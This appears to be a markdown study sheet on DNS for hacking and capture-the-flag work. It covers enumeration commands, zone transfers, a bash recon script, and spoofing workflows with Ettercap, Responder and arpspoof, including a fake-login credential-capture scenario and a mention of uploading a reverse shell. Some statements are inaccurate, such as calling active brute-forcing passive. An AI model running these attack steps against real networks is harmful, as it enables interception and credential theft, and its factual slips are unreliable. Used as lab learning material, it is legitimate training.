# DNS

### Table of Contents

1. [DNS Basics](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#dns-basics)
2. [How DNS Works](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#how-dns-works)
3. [DNS Enumeration](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#dns-enumeration)
4. [DNS Vulnerabilities](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#dns-vulnerabilities)
5. [DNS Attacks](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#dns-attacks)
6. [Tools & Commands](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#tools--commands)
7. [Real Scenarios](https://claude.ai/chat/da7c6e9a-2300-46f4-b1d2-775501f324d2#real-scenarios)

***

### DNS BASICS

#### What is DNS?

**DNS = Domain Name System**

Translates human-readable domain names into IP addresses.

```
User enters: google.com
DNS resolves: 142.250.185.46
Browser connects to: 142.250.185.46
```

#### Why Important for Hacking?

1. **Enumeration** - Discover subdomains and infrastructure
2. **Vulnerabilities** - DNSSEC bypass, zone transfers, etc.
3. **Attacks** - DNS spoofing, DNS tunneling
4. **Reconnaissance** - Information gathering without attacking

#### DNS Record Types

| Record | Purpose             | Example                   |
| ------ | ------------------- | ------------------------- |
| A      | Maps domain to IPv4 | example.com → 1.2.3.4     |
| AAAA   | Maps domain to IPv6 | example.com → ::1         |
| CNAME  | Alias for domain    | www → example.com         |
| MX     | Mail server         | mail → mail.example.com   |
| NS     | Nameserver          | ns.example.com            |
| TXT    | Text records        | v=spf1 include:google.com |
| SOA    | Start of Authority  | Zone info                 |
| PTR    | Reverse DNS         | 1.2.3.4 → example.com     |

***

### HOW DNS WORKS

#### DNS Resolution Process

```
1. User types: google.com in browser
   │
2. Computer checks local cache
   ├─ Found? Return cached IP
   └─ Not found? Continue...
   │
3. Query Recursive Resolver (ISP/8.8.8.8)
   │
4. Resolver queries Root Nameserver
   ├─ Root: "Go to TLD server for .com"
   │
5. Query TLD Nameserver (.com)
   ├─ TLD: "Go to authoritative server for google.com"
   │
6. Query Authoritative Nameserver (google's DNS)
   ├─ Auth: "google.com = 142.250.185.46"
   │
7. Result returned to Resolver
   │
8. Resolver returns IP to User (1.2.3.4)
   │
9. Browser connects to 1.2.3.4
```

#### DNS Hierarchy

```
                    Root Nameservers (.)
                            │
                    TLD Nameservers (.com, .org, .net)
                            │
                    Authoritative Nameservers (google.com)
                            │
                    Recursive Resolver (8.8.8.8, 1.1.1.1)
                            │
                        Your Device
```

***

### DNS ENUMERATION

#### What is DNS Enumeration?

Finding all DNS records associated with a domain to discover:

* Subdomains
* IP addresses
* Mail servers
* Nameservers
* Infrastructure information

#### Why Enumerate DNS?

```
Passive reconnaissance without alerting target
Discover hidden services/subdomains
Find infrastructure vulnerabilities
Identify technologies used
```

#### DNS Enumeration Methods

**1. NSLOOKUP - Basic DNS Queries**

**Installation:**

```bash
# Pre-installed in Kali
nslookup
```

**Basic Query:**

```bash
nslookup google.com
```

**Output:**

```
Server:		127.0.0.1
Address:	127.0.0.1#53

Non-authoritative answer:
Name:	google.com
Address: 142.250.185.46
```

**Query Specific Record Type:**

```bash
# A record (IPv4)
nslookup -type=A google.com

# AAAA record (IPv6)
nslookup -type=AAAA google.com

# MX record (Mail)
nslookup -type=MX google.com
```

**Output for MX:**

```
google.com	mail exchanger = 10 aspmx.l.google.com.
google.com	mail exchanger = 20 alt1.aspmx.l.google.com.
```

**Query Specific Nameserver:**

```bash
nslookup google.com 8.8.8.8
```

**Use Google's DNS instead of default**

**Interactive Mode:**

```bash
nslookup
> server 8.8.8.8
> set type=MX
> google.com
> exit
```

***

**2. DIG - Domain Information Groper**

**Installation:**

```bash
# Pre-installed in Kali
dig --version
```

**Basic Query:**

```bash
dig google.com
```

**Output:**

```
; <<>> DiG 9.16.1-Ubuntu <<>> google.com
;; Query time: 45 msec
;; SERVER: 127.0.0.1#53(127.0.0.1)

;; ANSWER SECTION:
google.com.		300	IN	A	142.250.185.46
```

**Get All Records (ANY):**

```bash
dig google.com ANY
```

**Shows A, AAAA, MX, NS, SOA, TXT records**

**Query Specific Record:**

```bash
dig google.com MX
dig google.com NS
dig google.com TXT
```

**Trace Full Resolution Path:**

```bash
dig +trace google.com
```

**Output:**

```
.			17289	IN	NS	a.root-servers.net.
com.		172800	IN	NS	a.gtld-servers.net.
google.com.	300	IN	A	142.250.185.46
```

**Reverse DNS Lookup:**

```bash
dig -x 142.250.185.46
```

**Output:**

```
46.185.250.142.in-addr.arpa. 3600 IN PTR sfo28s13-in-f14.1e100.net.
```

**Query Specific Nameserver:**

```bash
dig google.com @ns1.google.com
```

**Use google's nameserver directly**

**Short Format:**

```bash
dig google.com +short
```

**Output:**

```
142.250.185.46
```

***

**3. HOST - Simple DNS Lookup**

**Installation:**

```bash
# Pre-installed in Kali
host -V
```

**Basic Lookup:**

```bash
host google.com
```

**Output:**

```
google.com has address 142.250.185.46
google.com has IPv6 address 2607:f8b0:4004:80d::200e
google.com mail is handled by 10 aspmx.l.google.com.
```

**Reverse Lookup:**

```bash
host 142.250.185.46
```

**Query Specific Nameserver:**

```bash
host google.com 8.8.8.8
```

***

**4. WHOIS - Domain Registration Info**

**Installation:**

```bash
# Pre-installed in Kali
whois --version
```

**Query Domain:**

```bash
whois google.com
```

**Output:**

```
Domain Name: GOOGLE.COM
Registrar: MarkMonitor Inc.
Registrant: Google LLC
Admin Email: admin@google.com
Created Date: 1997-09-15
Expires Date: 2028-09-13
Nameserver: NS1.GOOGLE.COM
Nameserver: NS2.GOOGLE.COM
```

**Get Admin Contact:**

```bash
whois target.com | grep -i admin
```

**Get Nameserver Info:**

```bash
whois target.com | grep -i nameserver
```

***

**5. DNSRECON - Comprehensive DNS Enumeration**

**Installation:**

```bash
# Pre-installed in Kali
dnsrecon -h

# Or install
sudo apt install dnsrecon
```

**Standard Scan:**

```bash
dnsrecon -d google.com
```

**Output:**

```
[*] Google DNS resolved:
[+] 	 A: 142.250.185.46
[+]  	 A: 142.250.27.46
[*] MX Records:
[+]  	 aspmx.l.google.com. [10]
[+]  	 alt1.aspmx.l.google.com. [20]
[*] NS Records:
[+]  	 ns1.google.com.
[+]  	 ns2.google.com.
```

**Try Zone Transfer (Find All Records):**

```bash
dnsrecon -d google.com -a
```

**`-a` = Try zone transfer + standard queries**

**Brute Force Subdomains:**

```bash
dnsrecon -d google.com -D /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
```

**Output:**

```
[*] Attempting Domain Transfer
[!] AXFR failed!
[*] Performing Brute Force
[+] mail.google.com: 142.250.185.46
[+] maps.google.com: 142.250.185.46
[+] drive.google.com: 142.250.185.46
```

**Save to CSV:**

```bash
dnsrecon -d google.com -a -c output.csv
```

**Reverse Lookup (Find Hostnames):**

```bash
dnsrecon -r 142.250.0.0/16
```

**Find all domains in IP range**

***

**6. FIERCE - Subdomain Scanner**

**Installation:**

```bash
# Pre-installed in Kali (older), or:
sudo apt install fierce

# Or via Python
pip3 install fierce
```

**Scan Domain:**

```bash
fierce -d google.com
```

**Output:**

```
Found: mail.google.com
Found: maps.google.com
Found: drive.google.com
Found: photos.google.com
Found: docs.google.com
```

**Save Output:**

```bash
fierce -d google.com -o output.txt
```

**Specific IP Range:**

```bash
fierce -d google.com -r 142.250.0.0/16
```

***

**7. SUBDOMAIN ENUMERATION - Automated**

**Online Tools (Passive):**

```bash
# You don't run these, but good to know:
# - crt.sh (Certificate Transparency)
# - dnsdumpster.com
# - sublist3r
```

**Sublist3r (Local):**

```bash
# Install
pip3 install sublist3r

# Use
sublist3r -d google.com -o subdomains.txt
```

**Amass (Advanced):**

```bash
# Install
sudo apt install amass

# Use
amass enum -d google.com
```

***

#### DNS Enumeration Workflow

```bash
# Step 1: Basic info
whois target.com

# Step 2: Standard DNS records
dig target.com ANY
dig target.com MX
dig target.com NS

# Step 3: Zone transfer attempt
dnsrecon -d target.com -a

# Step 4: Subdomain enumeration
fierce -d target.com
dnsrecon -d target.com -D /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt

# Step 5: Reverse DNS
dnsrecon -r IP_RANGE

# Result: Complete DNS map of target infrastructure!
```

***

### DNS VULNERABILITIES

#### 1. Zone Transfer (AXFR) - Critical

**What is it?**

Zone transfer = Copying all DNS records from one nameserver to another (for backup/redundancy).

**Vulnerability:**

If misconfigured, ANYONE can request a zone transfer and get ALL DNS records!

**Test for Zone Transfer:**

```bash
# Using dig
dig @ns1.target.com target.com AXFR

# Output (if vulnerable):
target.com.   3600 IN SOA ns1.target.com. admin.target.com.
target.com.   3600 IN NS ns1.target.com.
target.com.   3600 IN NS ns2.target.com.
mail.target.com. 3600 IN A 1.2.3.4
admin.target.com. 3600 IN A 5.6.7.8
backup.target.com. 3600 IN A 9.10.11.12
db.target.com. 3600 IN A 13.14.15.16
...
```

**Using nslookup:**

```bash
nslookup
> server ns1.target.com
> ls target.com
```

**Using dnsrecon:**

```bash
dnsrecon -d target.com -a
```

**Why Dangerous?**

* Reveals ALL subdomains
* Shows ALL IP addresses
* Exposes internal infrastructure
* Helps plan further attacks

**Real Example - TryHackMe "Easy Peasy":**

```bash
dig @192.168.1.5 easypeasy.thm AXFR
# Returns all records including "flag" subdomain
```

***

#### 2. DNS Cache Poisoning (DNS Spoofing)

**What is it?**

Attacker inserts false DNS records into cache, so users get redirected to attacker's server.

```
Normal:  example.com → 1.2.3.4 (real server)
Poisoned: example.com → 9.9.9.9 (attacker server)
```

**How it Works:**

```
1. Attacker crafts fake DNS response
2. Sends it to DNS resolver faster than real response
3. Resolver caches the fake response
4. All users get redirected to attacker
5. Could be used for:
   - Phishing (fake login page)
   - Malware distribution
   - Man-in-the-middle attacks
```

**Tools:**

```bash
# DNS spoofing with Ettercap
ettercap -G
# Or command-line: ettercap -T -q -w output.log -F filter.ef

# Using Responder (for LAN attacks)
responder -I eth0
```

***

#### 3. DNS Enumeration (Information Disclosure)

**What is it?**

Ability to discover all DNS records and subdomains.

**Risk:**

* Reveals internal services
* Shows test/dev environments
* Exposes admin interfaces
* Helps plan targeted attacks

**Mitigation:**

* Disable zone transfers (AXFR)
* Use DNSSEC
* Hide internal DNS records
* Don't expose sensitive subdomains

***

#### 4. DNS Amplification Attack (DDoS)

**What is it?**

Using DNS servers to amplify attacks against target.

```
Attacker → Small DNS query to public server
Public DNS → Large response to target (victim)
Result: Target overwhelmed with traffic
```

**Example:**

```
Attacker sends: "nslookup -x 1.1.1.1" (small query)
DNS responds: Large response (amplification)
Response sent to: Victim's IP
Effect: Victim's bandwidth flooded
```

***

#### 5. DNS Tunneling

**What is it?**

Encoding arbitrary data inside DNS queries to bypass firewalls.

```
Normal DNS: example.com → 1.2.3.4
Tunneled:   data.example.com → contains hidden payload
```

**Tools:**

```bash
# DNSCat2 - DNS tunneling tool
git clone https://github.com/iagox86/dnscat2.git
```

***

### DNS ATTACKS

#### Attack 1: DNS Spoofing with Ettercap (LAN)

**Setup:**

```bash
# Install Ettercap
sudo apt install ettercap-graphical

# Start
sudo ettercap -G
```

**Configuration:**

```
1. Open Ettercap
2. Sniff → Unified sniffing
3. Select interface (eth0)
4. Start sniffing
5. Hosts → Scan for hosts
6. Target1 → Victim IP
7. Target2 → Gateway
8. Mitm → ARP poisoning
9. Configure DNS spoofing:
   - Edit /etc/etter/etter.dns
   - Add: example.com A 192.168.1.100
10. Mitm → DNS spoofing
11. Apply
```

**Result:**

```
Victim tries to access example.com
Gets redirected to 192.168.1.100 (attacker)
```

***

#### Attack 2: DNS Spoofing with Responder

**Setup:**

```bash
# Install
sudo apt install responder

# Start listening
sudo responder -I eth0 -r -d -w
```

**Parameters:**

* `-I eth0` = Interface
* `-r` = NBNS responses
* `-d` = DHCP responses
* `-w` = Start WPAD server

**What it does:**

```
Responds to LLMNR/NBT-NS queries
When victim tries to access invalid hostname
Responder responds with attacker's IP
Victim connects to attacker
```

**Capture credentials:**

```
When victim connects, might enter credentials
Responder captures them
Stored in: Responder/logs/
```

***

#### Attack 3: DNS Enumeration to Find Targets

**Workflow:**

```bash
# Step 1: Enumerate target
dnsrecon -d target.com -D /path/to/wordlist.txt

# Result: Find admin.target.com, test.target.com, backup.target.com

# Step 2: Check each subdomain
nmap -A admin.target.com
nmap -A test.target.com
nmap -A backup.target.com

# Step 3: Find vulnerable ones
# test.target.com has weak credentials
# admin.target.com runs old software
# backup.target.com has exposed backups

# Step 4: Exploit the one with vulnerability
```

***

#### Attack 4: Zone Transfer (AXFR)

**Workflow:**

```bash
# Step 1: Identify nameserver
dig target.com NS

# Output:
target.com. 300 IN NS ns1.target.com.
target.com. 300 IN NS ns2.target.com.

# Step 2: Try zone transfer
dig @ns1.target.com target.com AXFR

# Output (if vulnerable):
target.com. 3600 IN SOA ns1.target.com. admin.target.com.
internal.target.com. 3600 IN A 10.0.0.5
db.target.com. 3600 IN A 10.0.0.10
backup.target.com. 3600 IN A 10.0.0.20
admin.target.com. 3600 IN A 10.0.0.30

# Step 3: Map internal infrastructure
# Found internal IPs!
# Can now scan them

# Step 4: Scan internal systems
nmap 10.0.0.5
nmap 10.0.0.10
nmap 10.0.0.20
nmap 10.0.0.30
```

***

### TOOLS & COMMANDS

#### Quick Reference - Kali Commands

**DNS Information**

```bash
# Basic query
nslookup google.com

# All records
dig google.com ANY

# MX records (mail servers)
dig google.com MX

# Trace resolution
dig +trace google.com

# Short output
dig google.com +short

# Reverse DNS
dig -x 1.2.3.4
host -v 1.2.3.4

# Whois info
whois google.com
whois 1.2.3.4
```

**DNS Enumeration**

```bash
# Comprehensive scan
dnsrecon -d target.com

# Zone transfer attempt
dnsrecon -d target.com -a
dig @ns1.target.com target.com AXFR

# Subdomain brute force
dnsrecon -d target.com -D /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Fierce scanner
fierce -d target.com
fierce -d target.com -o output.txt

# Reverse DNS
dnsrecon -r 1.2.3.0/24

# Amass enumeration
amass enum -d target.com
```

**DNS Vulnerabilities**

```bash
# Test zone transfer
dig @ns1.target.com target.com AXFR
nslookup -type=AXFR target.com ns1.target.com

# DNS cache poisoning (Ettercap)
sudo ettercap -G

# Responder for LLMNR/NBT-NS spoofing
sudo responder -I eth0 -r -d

# DNS query analysis
tcpdump -i eth0 port 53
```

***

#### Installation

```bash
# All DNS tools pre-installed in Kali
# But just in case:

sudo apt update
sudo apt install -y dnsrecon fierce amass responder

# Python tools
pip3 install dnspython sublist3r
```

***

### REAL SCENARIOS

#### Scenario 1: Finding Hidden Subdomains

**Target:** hackit.local (vulnerable lab)

```bash
# Step 1: Basic DNS lookup
dig hackit.local

# Result: Single A record for main site

# Step 2: Enumerate subdomains
dnsrecon -d hackit.local -D /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Output:
[+] mail.hackit.local: 192.168.1.10
[+] admin.hackit.local: 192.168.1.11
[+] test.hackit.local: 192.168.1.12
[+] backup.hackit.local: 192.168.1.13

# Step 3: Scan found subdomains
nmap -A mail.hackit.local
nmap -A admin.hackit.local
nmap -A test.hackit.local
nmap -A backup.hackit.local

# Step 4: Find vulnerable one
# admin.hackit.local runs outdated WordPress 4.0
# test.hackit.local has directory listing enabled
# backup.hackit.local is world-readable

# Step 5: Exploit
# Download backup from backup.hackit.local
# Crack admin credentials from WordPress database
# Use them to access admin.hackit.local
```

***

#### Scenario 2: Zone Transfer Vulnerability

**Target:** vulnerable.local (DNSSEC not enabled)

```bash
# Step 1: Find nameserver
dig vulnerable.local NS

# Output:
vulnerable.local. 3600 IN NS ns1.vulnerable.local.

# Step 2: Try zone transfer
dig @ns1.vulnerable.local vulnerable.local AXFR

# Output (Vulnerable!):
vulnerable.local. 3600 IN SOA ns1.vulnerable.local. admin.vulnerable.local.
vulnerable.local. 3600 IN NS ns1.vulnerable.local.
api.vulnerable.local. 3600 IN A 192.168.1.50
admin.vulnerable.local. 3600 IN A 192.168.1.51
database.vulnerable.local. 3600 IN A 192.168.1.52
flag.vulnerable.local. 3600 IN TXT "flag{dns_zone_transfer}"
backup.vulnerable.local. 3600 IN A 192.168.1.53

# Step 3: Map entire infrastructure
# Found 5 systems!
# Found flag in DNS!
```

***

#### Scenario 3: DNS Spoofing Attack (Lab Network)

**Setup:**

```bash
# Attacker: 192.168.1.100 (Kali)
# Victim: 192.168.1.50
# Target: example.com (real server: 1.2.3.4)

# Attacker wants to redirect victim to fake site

# Step 1: Start Responder
sudo responder -I eth0 -r -d -w

# Step 2: Set up fake web server
cd /var/www/html
# Copy login page of example.com here
python3 -m http.server 80

# Step 3: ARP spoof victim
sudo arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

# Step 4: DNS spoof
# Responder automatically responds to DNS queries
# When victim queries example.com
# Responder responds with attacker's IP (192.168.1.100)
# Victim connects to attacker's fake site

# Step 5: Victim tries to login
# Fake login page captures credentials
# Attacker steals username and password
```

***

#### Scenario 4: Subdomain Enumeration to Find Admin Panel

**Target:** company.com

```bash
# Step 1: Enumerate subdomains
fierce -d company.com

# Output:
www.company.com
mail.company.com
admin.company.com
test.company.com
dev.company.com
staging.company.com
api.company.com

# Step 2: Check each for vulnerabilities
nikto -h http://www.company.com
nikto -h http://admin.company.com       ← OLD SOFTWARE!
nikto -h http://test.company.com        ← DEFAULT CREDS!
nikto -h http://dev.company.com
nikto -h http://api.company.com

# Step 3: Exploit
# admin.company.com runs WordPress 4.0 with known RCE
# test.company.com has default admin:admin credentials
# api.company.com has no authentication

# Step 4: Get shell
# Access test.company.com with default creds
# Upload shell
# Execute reverse shell
# Full access!
```

***

### DNS ATTACK CHECKLIST FOR HACKATHON

```bash
□ Step 1: Get nameservers
  dig target.com NS

□ Step 2: Try zone transfer
  dig @ns1.target.com target.com AXFR

□ Step 3: Enumerate subdomains
  dnsrecon -d target.com -D wordlist.txt
  fierce -d target.com

□ Step 4: Check each subdomain
  nmap -A subdomain.target.com

□ Step 5: Find vulnerable one
  nikto -h http://subdomain.target.com

□ Step 6: Exploit it
  sqlmap -u http://vulnerable.target.com
  # or
  # Web shell upload
  # Default credentials
  # Known exploits

□ Flag found!
```

***

### COMMON DNS RECORD FINDINGS

#### What Different Records Mean

```
A record pointing to internal IP (10.x.x.x):
  → Internal service exposed
  → Can likely access from outside network

MX record pointing to different server:
  → Mail server is separate
  → Might have different vulnerabilities

NS record from external provider:
  → DNS hosted elsewhere
  → Might be configurable by attacker

TXT record with SPF:
  → Shows which servers can send email
  → Reveals infrastructure info

CNAME pointing to CDN:
  → Service uses CloudFlare/Akamai
  → Might have protection
  → But real IP might leak elsewhere
```

***

### QUICK ENUMERATION SCRIPT

```bash
#!/bin/bash
# Save as dns_enum.sh

TARGET=$1

echo "[*] DNS Enumeration for $TARGET"

echo "[+] Basic Info"
whois $TARGET | grep -E "Registrant|Admin|Tech|Created|Expires|Nameserver" | head -20

echo "[+] Standard Records"
dig $TARGET ANY +short

echo "[+] MX Records"
dig $TARGET MX +short

echo "[+] Nameservers"
dig $TARGET NS +short

echo "[+] TXT Records"
dig $TARGET TXT +short

echo "[+] Zone Transfer Attempt"
for ns in $(dig $TARGET NS +short); do
    echo "[*] Trying $ns"
    dig @$ns $TARGET AXFR 2>/dev/null && echo "[!] VULNERABLE!"
done

echo "[+] Subdomain Enumeration"
dnsrecon -d $TARGET -D /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt 2>/dev/null | grep -E "^\[.*\]"

echo "[+] Done!"
```

**Usage:**

```bash
chmod +x dns_enum.sh
./dns_enum.sh target.com
```

***

### KEY TAKEAWAYS

```
1. DNS Enumeration is PASSIVE reconnaissance
   - No alerts to target
   - Reveals infrastructure
   - Shows subdomains and services

2. Zone Transfer is CRITICAL
   - Exposes all DNS records
   - Easy to exploit if enabled
   - Always worth trying

3. Subdomains are targets
   - Often less protected
   - May have default credentials
   - Might run old software

4. Tools to remember:
   - dig (detailed info)
   - dnsrecon (comprehensive)
   - fierce (subdomains)
   - nslookup (quick lookup)

5. Hackathon workflow:
   - Enumerate DNS first
   - Find all subdomains
   - Scan each subdomain
   - Pick vulnerable one
   - Exploit it
   - Get flag
```
